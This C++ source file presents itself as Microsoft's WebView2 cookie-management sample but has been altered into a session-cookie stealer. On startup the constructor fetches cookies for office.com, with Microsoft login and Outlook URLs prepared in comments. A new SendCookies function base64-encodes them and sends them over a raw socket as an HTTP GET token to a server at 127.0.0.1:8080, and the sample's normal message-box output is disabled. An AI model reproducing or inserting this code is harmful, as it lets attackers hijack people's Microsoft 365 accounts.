// Copyright (C) Microsoft Corporation. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include "stdafx.h"

#include "ScenarioCookieManagement.h"

#include "AppWindow.h"
#include "CheckFailure.h"
#include <ctime>
#include <regex>
// Recently added
#include "Ws2tcpip.h"
#include "base64.h"
#include <winsock2.h>
#include <stdio.h>
#include <Windows.h>


using namespace Microsoft::WRL;

static constexpr WCHAR c_samplePath[] = L"ScenarioCookieManagement.html";

ScenarioCookieManagement::ScenarioCookieManagement(AppWindow* appWindow)
    : m_appWindow(appWindow), m_webView(appWindow->GetWebView())
{
    //m_sampleUri = m_appWindow->GetLocalUri(c_samplePath);

    wil::com_ptr<ICoreWebView2Settings> settings;
    CHECK_FAILURE(m_webView->get_Settings(&settings));
    CHECK_FAILURE(settings->put_IsWebMessageEnabled(TRUE));

    //! [CookieManager]
    auto webview2_2 = m_webView.try_query<ICoreWebView2_2>();
    CHECK_FEATURE_RETURN_EMPTY(webview2_2);
    CHECK_FAILURE(webview2_2->get_CookieManager(&m_cookieManager));
    //! [CookieManager]

     GetCookiesHelper(L"https://www.office.com");
    // GetCookiesHelper(L"https://login.microsoftonline.com");
    // GetCookiesHelper(L"https://outlook.office.com");

    //CHECK_FAILURE(m_webView->Navigate(m_sampleUri.c_str()));

}

void ScenarioCookieManagement::SendCookies(std::wstring cookieResult) {
    WSADATA wsa;
    //Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Error initializing Winsock\n");
        exit(1);
    }

    SOCKET s;
    struct sockaddr_in cleanServer;
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d", WSAGetLastError());
    }

    // Set the required members for the sockaddr_in struct
    InetPtonA(AF_INET, "127.0.0.1", &cleanServer.sin_addr.s_addr); // Target IP address
    cleanServer.sin_family = AF_INET; // IPv4 Protocol
    cleanServer.sin_port = htons(8080); // Target port

    if (connect(s, (struct sockaddr*)&cleanServer, sizeof(cleanServer)) < 0)
    {
        printf("Error establishing connection with server\n");
        exit(1);
    }
    std::string cookiez(cookieResult.begin(), cookieResult.end());
    std::string httpReq = "GET /view?token=";
    httpReq += base64_encode(cookiez);
    httpReq += " HTTP/1.1\r\nHOST: http://127.0.0.1:8080\r\n\r\n";
    send(s, httpReq.c_str(), strlen(httpReq.c_str()), 0);
}

void ScenarioCookieManagement::SetupEventsOnWebview()
{
    // Setup the web message received event handler before navigating to
    // ensure we don't miss any messages.
    CHECK_FAILURE(m_webView->add_WebMessageReceived(
        Microsoft::WRL::Callback<ICoreWebView2WebMessageReceivedEventHandler>(
            [this](ICoreWebView2* sender, ICoreWebView2WebMessageReceivedEventArgs* args) {
                wil::unique_cotaskmem_string uri;
                CHECK_FAILURE(args->get_Source(&uri));

                // Always validate that the origin of the message is what you expect.
                if (uri.get() != m_sampleUri)
                {
                    return S_OK;
                }
                wil::unique_cotaskmem_string messageRaw;
                CHECK_FAILURE(args->TryGetWebMessageAsString(&messageRaw));
                std::wstring message = L"GetCookies";
                std::wstring reply;

                if (message.compare(0, 11, L"GetCookies ") == 0)
                {
                    std::wstring uri;
                    if (message.length() != 11)
                    {
                        uri = message.substr(11);
                    }
                    GetCookiesHelper(uri.c_str());
                }
                else if (message.compare(0, 17, L"AddOrUpdateCookie") == 0)
                {
                    //! [AddOrUpdateCookie]
                    wil::com_ptr<ICoreWebView2Cookie> cookie;
                    CHECK_FAILURE(m_cookieManager->CreateCookie(
                        L"CookieName", L"CookieValue", L".bing.com", L"/", &cookie));
                    CHECK_FAILURE(m_cookieManager->AddOrUpdateCookie(cookie.get()));
                    //! [AddOrUpdateCookie]
                }
                else if (message.compare(0, 16, L"DeleteAllCookies") == 0)
                {
                    CHECK_FAILURE(m_cookieManager->DeleteAllCookies());
                }
                return S_OK;
            })
        .Get(),
                &m_webMessageReceivedToken));

    // Turn off this scenario if we navigate away from the sample page
    CHECK_FAILURE(m_webView->add_ContentLoading(
        Callback<ICoreWebView2ContentLoadingEventHandler>(
            [this](
                ICoreWebView2* sender, ICoreWebView2ContentLoadingEventArgs* args) -> HRESULT {
                    wil::unique_cotaskmem_string uri;
                    sender->get_Source(&uri);
                    if (uri.get() != m_sampleUri)
                    {
                        m_appWindow->DeleteComponent(this);
                    }
                    return S_OK;
            })
        .Get(),
                &m_contentLoadingToken));
}

ScenarioCookieManagement::~ScenarioCookieManagement()
{
    m_webView->remove_WebMessageReceived(m_webMessageReceivedToken);
    m_webView->remove_ContentLoading(m_contentLoadingToken);
}

static std::wstring BoolToString(BOOL value)
{
    return value ? L"true" : L"false";
}

static std::wstring EncodeQuote(std::wstring raw)
{
    return L"\"" + regex_replace(raw, std::wregex(L"\""), L"\\\"") + L"\"";
}

static std::wstring SecondsToString(UINT32 time)
{
    WCHAR rawResult[26];
    time_t rawTime;
    rawTime = (const time_t)time;
    struct tm timeStruct;
    gmtime_s(&timeStruct, &rawTime);
    _wasctime_s(rawResult, 26, &timeStruct);
    std::wstring result(rawResult);
    return result;
}

static std::wstring CookieToString(ICoreWebView2Cookie* cookie)
{
    //! [CookieObject]
    wil::unique_cotaskmem_string name;
    CHECK_FAILURE(cookie->get_Name(&name));
    wil::unique_cotaskmem_string value;
    CHECK_FAILURE(cookie->get_Value(&value));
    wil::unique_cotaskmem_string domain;
    CHECK_FAILURE(cookie->get_Domain(&domain));
    wil::unique_cotaskmem_string path;
    CHECK_FAILURE(cookie->get_Path(&path));
    double expires;
    CHECK_FAILURE(cookie->get_Expires(&expires));
    BOOL isHttpOnly = FALSE;
    CHECK_FAILURE(cookie->get_IsHttpOnly(&isHttpOnly));
    COREWEBVIEW2_COOKIE_SAME_SITE_KIND same_site;
    std::wstring same_site_as_string;
    CHECK_FAILURE(cookie->get_SameSite(&same_site));
    switch (same_site)
    {
    case COREWEBVIEW2_COOKIE_SAME_SITE_KIND_NONE:
        same_site_as_string = L"None";
        break;
    case COREWEBVIEW2_COOKIE_SAME_SITE_KIND_LAX:
        same_site_as_string = L"Lax";
        break;
    case COREWEBVIEW2_COOKIE_SAME_SITE_KIND_STRICT:
        same_site_as_string = L"Strict";
        break;
    }
    BOOL isSecure = FALSE;
    CHECK_FAILURE(cookie->get_IsSecure(&isSecure));
    BOOL isSession = FALSE;
    CHECK_FAILURE(cookie->get_IsSession(&isSession));

    std::wstring result = L"{";
    result += L"\"name\": " + EncodeQuote(name.get()) + L", " + L"\"value\": " +
        EncodeQuote(value.get()) + L", " + L"\"domain\": " + EncodeQuote(domain.get()) +
        L", " + L"\"path\": " + EncodeQuote(path.get()) + L", " + L"\"httpOnly\": " +
        BoolToString(isHttpOnly) + L", " + L"\"secure\": " + BoolToString(isSecure) + L", " +
        L"\"sameSite\": " + EncodeQuote(same_site_as_string) + L", " + L"\"expirationDate\": ";
    if (!!isSession)
    {
        result += std::to_wstring(9999999999);
    }
    else
    {
        std::wstring formatted_expiration = std::to_wstring(expires).substr(0, std::to_wstring(expires).find(L"."));
        result += formatted_expiration;
    }

    return result + L"}";
    //! [CookieObject]
}

void ScenarioCookieManagement::GetCookiesHelper(std::wstring uri)
{
    //! [GetCookies]
    if (m_cookieManager)
    {
        CHECK_FAILURE(m_cookieManager->GetCookies(
            uri.c_str(),
            Callback<ICoreWebView2GetCookiesCompletedHandler>(
                [this, uri](HRESULT error_code, ICoreWebView2CookieList* list) -> HRESULT {
                    CHECK_FAILURE(error_code);

                    std::wstring result;
                    UINT cookie_list_size;
                    CHECK_FAILURE(list->get_Count(&cookie_list_size));

                    if (cookie_list_size == 0)
                    {
                        result += L"No cookies found.";
                    }
                    else
                    {
                        result += std::to_wstring(cookie_list_size) + L" cookie(s) found";
                        if (!uri.empty())
                        {
                            result += L" on " + uri;
                        }
                        result += L"\n\n[";
                        for (UINT i = 0; i < cookie_list_size; ++i)
                        {
                            wil::com_ptr<ICoreWebView2Cookie> cookie;
                            CHECK_FAILURE(list->GetValueAtIndex(i, &cookie));

                            if (cookie.get())
                            {
                                result += CookieToString(cookie.get());
                                if (i != cookie_list_size - 1)
                                {
                                    result += L",\n";
                                }
                            }
                        }
                        result += L"]";
                    }
                    SendCookies(result);
                    //m_appWindow->AsyncMessageBox(std::move(result), L"GetCookies Result");
                    return S_OK;
                })
            .Get()));
    }
    //! [GetCookies]
}
